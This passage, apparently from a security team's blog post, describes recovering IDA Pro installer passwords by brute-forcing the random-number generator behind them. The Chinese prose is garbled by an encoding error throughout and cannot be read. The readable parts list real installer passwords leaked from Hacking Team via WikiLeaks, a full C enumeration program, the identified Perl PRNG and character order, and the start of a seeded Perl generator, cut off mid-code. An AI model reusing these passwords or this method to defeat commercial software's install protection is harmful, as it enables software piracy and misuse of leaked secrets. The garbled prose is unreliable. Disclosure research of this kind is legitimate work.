&lt;p&gt;Âú®ÊàëÂÄëÂúòÈöäÊàêÂì°ËÖ¶ÂäõÊøÄÁõ™‰∏ãÔºåÁµ¶Âá∫‰∫Ü‰∏ÄÂÄãÈ©óË≠âÊÄßÁöÑÁ≠îÊ°àÔºöÊòØÁöÑÔºåÂú®Êúâ Linux Êàñ MacOS ÁâàÂÆâË£ùÊ™îÁöÑÁãÄÊ≥Å‰∏ãÔºåÊàëÂÄëÂèØ‰ª•Áõ¥Êé•ÊâæÂà∞Ê≠£Á¢∫ÁöÑÂÆâË£ùÂØÜÁ¢ºÔºõËÄåÂú®Êúâ Windows ÁâàÂÆâË£ùÊ™îÁöÑÁãÄÊ≥Å‰∏ãÔºåÊàëÂÄëÂè™ÈúÄË¶ÅÂçÅÂàÜÈêòÂ∞±ÂèØÁÆóÂá∫ÂÆâË£ùÂØÜÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏ãÈù¢Â∞±ÊòØÊàëÂÄëÁöÑÈ©óË≠âÊµÅÁ®ãÔºö&lt;/p&gt;

&lt;h3 id=&quot;-linux-‰ª•Âèä-macos-Áâà&quot;&gt;* Linux ‰ª•Âèä MacOS Áâà&lt;/h3&gt;

&lt;p&gt;ÊúÄÂÖàÈ©óË≠âÊàêÂäüÁöÑÊòØ Linux Âèä MacOS ÁâàÔºåÈÄôÂÖ©ÂÄãÁâàÊú¨ÈÉΩÊòØÈÄèÈÅé InstallBuilder Â∞ÅË£ùÊàêÂÆâË£ùÊ™î„ÄÇÊàëÂÄëÂòóË©¶Âü∑Ë°åÂÆâË£ùÁ®ãÂºèÔºå‰∏¶Âú®Ë®òÊÜ∂È´î‰∏≠Áõ¥Êé•ÁôºÁèæ‰∫ÜÊú™Âä†ÂØÜÁöÑÂÆâË£ùÂØÜÁ¢º„ÄÇ‰ªªÂãôÈÅîÊàêÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÈÄèÈÅé Hex-Rays ÂçîÂä©ÂõûÂ†±ÂæåÔºå&lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; ‰πüÂú® 2019/02/11 ÈáãÂá∫‰∫Ü InstallBuilder 19.2.0ÔºåÂä†Âº∑‰∫ÜÂÆâË£ùÂØÜÁ¢ºÁöÑ‰øùË≠∑„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;-windows-Áâà&quot;&gt;* Windows Áâà&lt;/h3&gt;

&lt;p&gt;Âú® Windows Áâà‰∏äËß£Ê±∫ÈÄôÂÄãÂïèÈ°åÊòØÈ†ÖÊåëÊà∞ÔºåÂõ†ÁÇ∫ÈÄôÂÄãÂÆâË£ùÊ™îÊòØÈÄèÈÅé &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt; Â∞ÅË£ùÁöÑÔºåÂÖ∂ÂÆâË£ùÂØÜÁ¢ºÊòØÊé°Áî® &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt; ÁöÑÊñπÂºèÂÑ≤Â≠òÔºåÂõ†Ê≠§ÊàëÂÄëÁÑ°Ê≥ïÈÄèÈÅéÈùúÊÖã„ÄÅÂãïÊÖãÁ®ãÂºèÂàÜÊûêÁõ¥Êé•ÂèñÂæóÂØÜÁ¢ºÔºåÈÄèÈÅéÊö¥ÂäõÂàóËàâ‰πü‰∏çÊòØ‰∏ÄÂÄãÊúâÊïàÁéáÁöÑÊñπÂºè„ÄÇ‰∏çÈÅéÔºåÂ¶ÇÊûúÊàëÂÄëÊéåÊè°‰∫ÜÁî¢ÁîüÂØÜÁ¢ºÁöÑÊñπÂºèÔºåÈÇ£ÁµêÊûúÂèØËÉΩÂ∞±‰∏ç‰∏ÄÊ®£‰∫ÜÔºåÊàëÂÄë‰πüË®±ÂèØ‰ª•Êõ¥ÊúâÊïàÁéáÁöÑÁ™ÆËàâ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈõñÁÑ∂ÊàëÂÄëÂ∑≤Á∂ìÊúâ‰∫ÜÊñπÂêëÊòØË¶ÅÊâæÂá∫ Hex-Rays Â¶Ç‰ΩïÁî¢ÁîüÂØÜÁ¢ºÔºå‰ΩÜË¶ÅÂéªÈ©óË≠âÂçªÊòØ‚ÄùÈùûÂ∏∏Âõ∞Èõ£‚ÄùÁöÑ„ÄÇÂõ†ÁÇ∫ÊàëÂÄë‰∏çÁü•ÈÅì‰∫ÇÊï∏Áî¢ÁîüÂô®ÊòØÁî®‰ªÄÈ∫ºË™ûË®ÄÂØ¶‰ΩúÁöÑÔºåËÄåÁõÆÂâçÂ∑≤Áü•Ëá≥Â∞ëÊúâ &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 Á®Æ‰∫ÇÊï∏Áî¢ÁîüÂô®&lt;/a&gt;ÔºåÁ®ÆÈ°ûÂ§™Â§ö‰∫Ü„ÄÇÂêåÊôÇÔºåÊàëÂÄë‰πüÁÑ°Ê≥ïÁü•ÈÅì‰∫ÇÊï∏Áî¢ÁîüÂô®ÊâÄ‰ΩøÁî®ÁöÑÂ≠óÂÖÉÁµÑÂíåÂ≠óÂÖÉÈ†ÜÂ∫èÊòØ‰ªÄÈ∫º„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë¶ÅÊâæÂá∫‰∫ÇÊï∏Áî¢ÁîüÂô®ÊâÄ‰ΩøÁî®ÁöÑÂ≠óÂÖÉÁµÑÊòØÁúæÂ§öÂõ∞Èõ£‰∫ã‰∏≠ÊØîËºÉÁ∞°ÂñÆÁöÑ‰∏Ä‰ª∂ÔºåÈ¶ñÂÖàÔºåÊàëÂÄëÁ´≠Áõ°ÊâÄËÉΩÁöÑÊî∂ÈõÜÊâÄÊúâ IDA Pro ÁöÑÂÆâË£ùÂØÜÁ¢ºÔºå‰æãÂ¶Ç WikiLeaks ÊâÄÊè≠Èú≤ÁöÑ hackingteam ‰ΩøÁî®‰πãÂØÜÁ¢ºÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂæûÊâÄÊúâÊî∂ÈõÜÂà∞ÁöÑÂÆâË£ùÂØÜÁ¢º‰∏≠ÊàëÂÄëÊï¥ÁêÜÂá∫ÊâÄÁî®Âà∞ÁöÑÂ≠óÂÖÉÁµÑÔºö
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Â∞ë‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; Â≠óÂÖÉÔºåÊé®Ê∏¨ÈÄô‰∫õÈÉΩÊòØÂÆπÊòìÊ∑∑Ê∑ÜÁöÑÂ≠óÂÖÉÔºåÂõ†Ê≠§‰∏çÊîæÂÖ•ÂØÜÁ¢ºÂ≠óÂÖÉÁµÑ‰∏≠ÊòØÂêàÁêÜÁöÑ„ÄÇÊé•ËëóÔºåÊàëÂÄëÁî®ÈÄô‰∫õÂ≠óÂÖÉÁµÑÔºåÁåúÊ∏¨ÂèØËÉΩÁöÑÊéíÂàóÈ†ÜÂ∫èÔºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊúÄÂæåÔºåÊàëÂÄëÊåëÈÅ∏ÂπæÂÄãÊØîËºÉÂ∏∏Ë¶ãÁöÑË™ûË®ÄÔºàc/php/python/perlÔºâ‰∏¶‰ΩøÁî®‰∏äËø∞ÁöÑÂ≠óÂÖÉÁµÑÂØ¶‰Ωú‰∫ÇÊï∏Áî¢ÁîüÂô®ÔºåÂàóËàâÊâÄÊúâ‰∫ÇÊï∏ÁµÑÂêàÔºåÁúãÁúãÊàëÂÄëÊî∂ÈõÜÂà∞ÁöÑÂÆâË£ùÂØÜÁ¢ºÊúâÊ≤íÊúâÂá∫ÁèæÂú®ÈÄô‰∫õÁµÑÂêà‰∏≠„ÄÇ‰æãÂ¶ÇÊàëÂÄëÁî®‰∏ãÈù¢Á®ãÂºèÁ¢ºÂàóËàâ C Ë™ûË®ÄÁöÑ‰∫ÇÊï∏ÁµÑÂêàÔºö&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Â§ßÁ¥Ñ‰∏ÄÂÄãÊúàÁöÑÈÅãÁÆóÔºåÊàëÂÄëÁµÇÊñºÊàêÂäüÂà©Áî® Perl ‰∫ÇÊï∏Áî¢ÁîüÂá∫ IDA Pro ÁöÑÂÆâË£ùÂØÜÁ¢ºÔºåËÄåÊ≠£Á¢∫ÁöÑÂ≠óÂÖÉÁµÑÈ†ÜÂ∫èÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;„ÄÇ‰æãÂ¶Ç hacking team Ê¥©ÊºèÁöÑ IDA Pro 6.8 ÂÆâË£ùÂØÜÁ¢ºÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt;ÔºåÂ∞±ÂèØÁî®‰∏ãÈù¢Á®ãÂºèÁ¢ºÁî¢ÁîüÔºö&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
